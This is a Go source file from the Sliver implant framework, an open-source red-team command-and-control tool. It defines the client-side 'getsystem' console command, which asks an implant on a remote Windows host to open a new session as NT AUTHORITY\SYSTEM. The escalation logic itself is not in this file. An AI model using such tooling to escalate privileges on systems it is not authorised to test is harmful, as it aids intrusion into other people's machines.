package privilege

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"

	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/desertbit/grumble"
	"google.golang.org/protobuf/proto"
)

// GetSystemCmd - Windows only, attempt to get SYSTEM on the remote system
func GetSystemCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}
	targetOS := getOS(session, beacon)
	if targetOS != "windows" {
		con.PrintErrorf("Command only supported on Windows.\n")
		return
	}

	process := ctx.Flags.String("process")
	config := con.GetActiveSessionConfig()
	ctrl := make(chan bool)
	con.SpinUntil("Attempting to create a new sliver session as 'NT AUTHORITY\\SYSTEM'...", ctrl)

	getSystem, err := con.Rpc.GetSystem(context.Background(), &clientpb.GetSystemReq{
		Request:        con.ActiveTarget.Request(ctx),
		Config:         config,
		HostingProcess: process,
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	if getSystem.Response != nil && getSystem.Response.Async {
		con.AddBeaconCallback(getSystem.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, getSystem)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
				return
			}
			PrintGetSystem(getSystem, con)
		})
		con.PrintAsyncResponse(getSystem.Response)
	} else {
		PrintGetSystem(getSystem, con)
	}
}

// PrintGetSystem - Print the results of get system
func PrintGetSystem(getsystemResp *sliverpb.GetSystem, con *console.SliverConsoleClient) {
	if getsystemResp.Response != nil && getsystemResp.Response.GetErr() != "" {
		con.PrintErrorf("%s\n", getsystemResp.GetResponse().GetErr())
		return
	}
	con.Println()
	con.PrintInfof("A new SYSTEM session should pop soon...\n")
}
